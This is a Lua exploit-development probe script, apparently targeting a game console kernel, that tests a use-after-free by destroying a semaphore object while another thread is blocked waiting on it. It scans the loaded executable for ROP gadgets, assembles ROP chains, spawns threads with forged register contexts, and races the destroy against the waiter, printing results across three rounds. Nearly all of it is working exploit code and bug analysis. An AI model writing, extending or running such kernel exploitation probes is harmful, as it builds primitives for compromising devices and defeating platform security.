-- CRASH_CLASS: HIGH
-- PROBE 840b: destroy an osem object while another thread is blocked waiting on it
--
-- 553 (wait) queues a waiter node into [obj+0x30] and msleeps with the object lock
-- dropped.  The waiter takes no reference on the object.  550 (destroy) sets the
-- dead bit, unlinks and wakes every waiter, decrements [obj+0x54] and frees the
-- 0x60 object when it hits zero.  So the woken thread re-locks obj+0x18, writes
-- [obj+0x50] = count-1 and unlocks obj+0x18 on a chunk that may already be free.
--
-- Round 1 and 3 have a waiter; round 2 is the control.  Nothing is reclaimed, so
-- the question is only whether the free really happens while the waiter is queued
-- and whether the post-free writes are survivable.

print("=== PROBE 840b: destroy while a thread waits ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function hx(v)
    local n=to_num(v)
    if n<0 then return string.format("-%X",-n) end
    return string.format("%X",n)
end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end return 0 end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local READ, WRITE, SOCKETPAIR = 3, 4, 135
local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C))*4294967296 + (rd(info+0x108))
local function find_pat(base, limit, pat)
    local chunk, off = 0x1000, 0
    while off < limit do
        local want = limit - off
        if want > chunk then want = chunk end
        local ok, s = pcall(function() return memory.read_buffer(base+off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
    return nil
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58,0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F,0xC3))
local pop_rsi = find_pat(ebase, 0x494000, string.char(0x5E,0xC3))
local pop_rdx = find_pat(ebase, 0x494000, string.char(0x5A,0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB,0xFE))
local mov_rdi_rax = find_pat(ebase, 0x494000, string.char(0x48,0x89,0x07,0xC3))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and jmp_g and mov_rdi_rax) then
    print("[0] gadgets missing") return
end
print(string.format("[0] eboot=%X", ebase))

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end
local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
             RDI=0x048, RSI=0x050, RDX=0x058, RAX=0x078}
local STACK = page*4
local function spawn_parked(fd, chainw)
    local block = mmap(STACK)
    if block == 0 then return false, 0 end
    local base = block + STACK - 0x200
    for i = 1, #chainw do wq(base + (i-1)*8, uint64(chainw[i])) end
    local buf = mmap(page)
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx+Ctx.MAGIC, uint64(0x480)); wq(ctx+Ctx.TYPE, uint64(0x10000))
    wq(ctx+Ctx.CS, uint64(0x43));     wq(ctx+Ctx.SS, uint64(0x3B))
    wq(ctx+Ctx.RIP, uint64(fn));      wq(ctx+Ctx.RSP, uint64(base))
    wq(ctx+Ctx.RDI, uint64(fd));      wq(ctx+Ctx.RSI, uint64(buf))
    wq(ctx+Ctx.RDX, uint64(1));       wq(ctx+Ctx.RAX, uint64(READ))
    local tb = memory.alloc(8)
    wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok and to_num(rv) == 0, rd(tb) or 0
end
-- after the parked read: 553(id, 1, 0) then thr_exit(431)
local function chain_wait(id, outpage, tmo)
    return {pop_rdi, id, pop_rsi, 1, pop_rdx, tmo,
            pop_rax, 553, fn,
            pop_rdi, outpage, mov_rdi_rax,
            pop_rax, 431, fn, jmp_g}
end
local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(uint64(ts), uint64(0)) end) end
local fds = memory.alloc(8)
local function pairsock()
    wd(fds, 0xFFFFFFFF); wd(fds+4, 0xFFFFFFFF)
    local ok, rv = pcall(function() return mk(SOCKETPAIR)(uint64(1), uint64(1), uint64(0), uint64(fds)) end)
    return ok and to_num(rv) == 0, rd(fds) or 0, rd(fds+4) or 0
end
local sc549, sc550, sc551, sc555 = mk(549), mk(550), mk(551), mk(555)
local nb = memory.alloc(0x20)
local function setname(s) zero(nb, 0x20); for i=1,#s do memory.write_byte(nb+i-1, string.byte(s,i)) end end
local function create_sem(tag, a3, a4)
    setname(tag)
    local ok, r = pcall(function() return sc549(uint64(to_num(nb)), uint64(0x101), uint64(a3), uint64(a4)) end)
    if ok then return to_num(r) end
    return -999
end
local function destroy(id)
    local ok, r = pcall(function() return sc550(uint64(id)) end)
    if ok then return to_num(r) end
    return -999
end
local function post(id, n)
    local ok, r = pcall(function() return sc555(uint64(id), uint64(n)) end)
    if ok then return to_num(r) end
    return -999
end

for round = 1, 3 do
    local id = create_sem("w" .. tostring(round), 0, 0x1000)
    print(string.format("[A%d] create id=%s", round, hx(id)))
    if id <= 0 then break end
    local released = false
    local status = mmap(page)
    wd(status, 0xEEEEEEEE)
    local tmo = mmap(page)
    wd(tmo, 2000)        -- 553 arg3: milliseconds, written back with the remainder
    local sok, a, b = pairsock()
    local okc = false
    if sok then
        local t
        okc, t = spawn_parked(b, chain_wait(id, status, tmo))
        print(string.format("[B%d] spawned=%s tid=%s", round, tostring(okc), hx(t)))
    else
        print(string.format("[B%d] socketpair failed", round))
    end
    -- rounds 1/3 release the waiter BEFORE the destroy (the waiter is queued);
    -- round 2 destroys first and releases afterwards, so 553 must find no id.
    if round ~= 2 then
        if okc then
            pcall(function() return mk(WRITE)(uint64(a), uint64(nb), uint64(1), uint64(0), uint64(0)) end)
            sleep_ms(80)
        end
    else
        print(string.format("[B%d] control: release after destroy", round))
    end
    print(string.format("[C%d] destroying", round))
    if round == 2 and okc then
        pcall(function() return mk(WRITE)(uint64(a), uint64(nb), uint64(1), uint64(0), uint64(0)) end)
        sleep_ms(5)
    end
    local dr = destroy(id)
    print(string.format("[D%d] destroy ret=%s", round, hx(dr)))
    sleep_ms(80)
    local h = create_sem("h" .. tostring(round), 1, 0x100)
    print(string.format("[E%d] health create=%s post=%s", round, hx(h), hx(post(h, 1))))
    if h > 0 then print(string.format("[F%d] health destroy=%s", round, hx(destroy(h)))) end
    print(string.format("[G%d] child rax=%X  timeout-remainder=%X", round, rd(status), rd(tmo)))
end
print("[Z] alive=true")
print("=== PROBE 840b COMPLETE ===")
